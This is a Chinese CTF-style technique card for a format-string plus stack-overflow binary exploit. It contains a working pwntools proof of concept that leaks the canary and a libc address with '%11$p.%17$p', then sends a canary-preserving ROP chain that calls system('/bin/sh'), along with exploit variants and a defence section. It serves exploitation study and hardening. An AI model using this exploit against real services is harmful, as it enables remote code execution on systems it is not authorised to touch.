---
id: binary-pwn-format-string-canary-libc-leak-rop-system
title: 格式化字符串一次泄露 Canary 与 libc 后带 Canary 栈溢出 ROP 取 shell
type: scenario
domain: binary
path: binary/pwn/format-string
technique: format-string-canary-libc-leak-rop
aliases:
- 格式化字符串泄露 Canary 和 libc
- '%11$p Canary'
- '%17$p libc'
- 带 Canary 回填的栈溢出
- canary 保留 ROP
- printf(buf) 组合利用
tags:
- pwn
- format-string
- canary
- libc-leak
- aslr
- stack-overflow
- rop
- no-pie
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V98
  verified_at: '2026-11-05T19:58:02+08:00'
  notes: 已对照原文与图10-14核对：checksec vuln（图10）Canary/NX/No PIE；feedback buf[40]/read 0x1f/printf(buf)（图11）、query buf[40]/read 0x100（图12）、%11.%17 泄露（图13，%17=0x7ffff7c2a1ca）与原文及卡内槽位一致；图14 实机 id=ctf、cat /flag 成功。libc 偏移 0x2a1ca 仅对应题目 libc，卡内已注明。未验证点：PoC 未在本机复跑；frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

同一程序里同时存在 `printf(user_input)` 的格式化字符串漏洞与栈溢出时，可用一次 `%N$p` 输出同时读出栈上的 Canary 和 libc 返回地址；把 Canary 原样回填后溢出返回地址，构造 `pop rdi; ret` + `/bin/sh` + `system` 的 ROP 链即可拿 shell。

## 原理

- `feedback()` 把最多 31 字节输入读入 `buf[40]`，随后直接 `printf(buf)`：用户输入被当成格式串，`%11$p` 会按第 11 个可变参数槽解释栈上的值并以十六进制打印。printf 的前 5 个可变参数使用寄存器（RSI、RDX、RCX、R8、R9），第 6 个起对应栈上的连续 qword；`buf` 占 5 个 qword（40 字节），所以 Canary 位于 `%11$p`（6 + 5）。
- Canary 的低字节为 `0x00`，用于阻止字符串操作越过；用 `%p` 泄露出的 Canary 通常形如 `0x......00`，且每次进程启动都变化，必须本次泄露、本次回填。函数返回前会与 `fs:0x28` 比较，回填错误触发 `__stack_chk_fail`。
- 同一进程的栈深处还保存着 libc 内的返回地址（如 `__libc_start_call_main` 附近的地址）。本例用 `%17$p` 读出该地址，减去题目所给 `libc.so.6` 中对应返回地址的静态偏移（本例 `0x2a1ca`）得到 libc 基址；不同 libc 版本该偏移不同，必须用题目提供的 libc 在本地核对。
- `query()` 把最多 `0x100` 字节读入 `char buf[40]`，存在栈溢出；但函数带有 Canary 校验，不能直接覆盖返回地址。利用格式化字符串泄露的 Canary，payload 依次为 40 字节填充、正确 Canary、8 字节保存 RBP、返回地址链。
- 64 位 `system` 需要入口 RSP 满足 `RSP % 16 == 8`；本例在链首额外放一个 `ret` gadget 调整 8 字节，再放 `pop rdi; ret`、`"/bin/sh"` 地址和 `system`。若不加 `ret` 就在 `system` 内崩溃，通常是这个对齐问题。
- 31 字节的格式串长度不足以可靠构造 `%n` 任意写，但足够放下 `%11$p.%17$p` 这类短泄漏；因此路线是“泄漏 + 二次溢出”，而不是格式串任意写。

## 触发条件

- 程序存在直接以用户输入为格式串的 `printf`/`fprintf`/`syslog` 调用，且栈上有 Canary 与 libc 地址可读。
- 同一进程存在可覆盖返回地址的栈溢出，目标函数开启 Canary。
- 二进制未开启 PIE（或已泄露代码基址），能确定 `pop rdi; ret`/`ret` 等 gadget 与 PLT 地址；libc 版本已知或可由泄漏匹配。
- 格式化字符串输入长度受限时，泄漏槽位必须在有限字节内表达。

## 利用步骤

1. `checksec` 确认 Canary、NX、No PIE；反编译定位 `printf(buf)` 与溢出函数。
2. 用 `AAAA.%p.%p...` 或 `%1$p` 到 `%30$p` 扫描，确定 `buf` 起始槽位；本例 `buf` 从 `%6$p` 开始，40 字节后 Canary 在 `%11$p`。继续向后找栈上属于 libc 的返回地址（本例 `%17$p`）。
3. 发送 `%11$p.%17$p` 之类的组合格式串，一次输出中解析 Canary 与 libc 地址；用 `libc_base = leak - offset` 计算基址，offset 由题目 libc 的符号/调试信息确认。
4. 计算 `system`、`"/bin/sh"`、`pop rdi`、`ret` 地址（No PIE 时 gadget 地址固定；libc 内地址加基址）。
5. 在溢出函数中发送 `padding(40) + canary + 8 字节 + ret + pop_rdi + binsh + system`，获取 shell。
6. 若失败，先在 gdb 中检查 Canary 是否一致、`system` 入口 `RSP % 16` 是否为 8，再调整 gadget 顺序或增删 `ret`。

## PoC

```python
from pwn import *

context.arch = "amd64"
elf = ELF("./vuln")
libc = ELF("./libc.so.6")

p = remote(host, port)

# 1) 格式化字符串：一次泄露 Canary 与 libc 返回地址
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Leave a comment: ", b"%11$p.%17$p")
p.recvuntil(b"Your comment: ")
canary_s, libc_s = p.recvline().strip().split(b".")

canary = int(canary_s, 16)
libc.address = int(libc_s, 16) - 0x2a1ca      # 偏移按题目 libc 核对

system_addr = libc.symbols["system"]
bin_sh = next(libc.search(b"/bin/sh\x00"))
rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

# 2) 带 Canary 的栈溢出 ROP
p.sendlineafter(b"> ", b"2")
payload  = b"A" * 40          # buf[40]
payload += p64(canary)        # 回填本次泄露的 Canary
payload += b"B" * 8           # 保存的 RBP
payload += p64(ret)           # 16 字节栈对齐
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_addr)
p.sendlineafter(b"Enter query: ", payload)
p.interactive()
```

```text
栈槽定位（本例）：buf 40 字节 = 5 qword，从 %6$p 起
  Canary  -> %11$p
  libc 返回地址 -> %17$p
```

## 变体与关联

- 变体：若 Canary 不在固定槽，可循环 `%1$p` 到 `%100$p` 扫描“低字节为 00 且每次运行变化”的值；若存在多个 Canary 副本，任选稳定槽。
- 变体：若程序还开启 PIE，可同时用 `%p` 泄露代码地址（如 `main` 的返回地址）计算代码基址，再定位 PLT/gadget。
- 变体：输入长度足够时，可用 `%n` 做任意写直接改 GOT/返回地址，省去二次溢出。
- 变体：无 `pop rdi` 时用 ret2csu、one_gadget 或 `mov rsp, rdi` 类 thunk；libc 版本未知时用 libc-database 按泄漏地址低 12 位匹配。
- 关联：[[binary-pwn-format-string-canary-leak-ret2copy-authorized-keys]]（同类的 Canary 泄露，但目标是文件复制函数写 authorized_keys）、[[binary-pwn-stack-ret2libc]]（动态链接 ret2libc 的通用流程）、[[binary-pwn-stack-ret2text-win-plus-one-align]]（后门函数 ret2text 的对齐修正）。
- 边界：本例 libc 偏移 `0x2a1ca` 只对应题目附带的 `libc.so.6`；换版本后必须重新计算，否则 `system` 地址错误会直接崩溃。

## 检测与防御

- 检测：代码审计搜索 `printf(user_input)`、`fprintf(f, user_input)`、`syslog(user_input)` 等格式串误用；监控 `__stack_chk_fail`/SIGABRT 与异常的 `system`/`execve` 调用；对同一连接内“先泄漏后溢出”的输入模式做行为检测。
- 修复：格式化输出统一写 `printf("%s", buf)` 或 `fputs`；开启 `-Wformat-security` 与 `-D_FORTIFY_SOURCE=2`；对 `read` 上限做边界校验；启用 Canary、PIE、Full RELRO。
- 加固：ASLR 保持开启；高权限服务降权并启用 seccomp 限制 `execve`；不要向用户暴露带调试符号与完整 libc 的服务；对输入长度和格式字符做白名单校验。
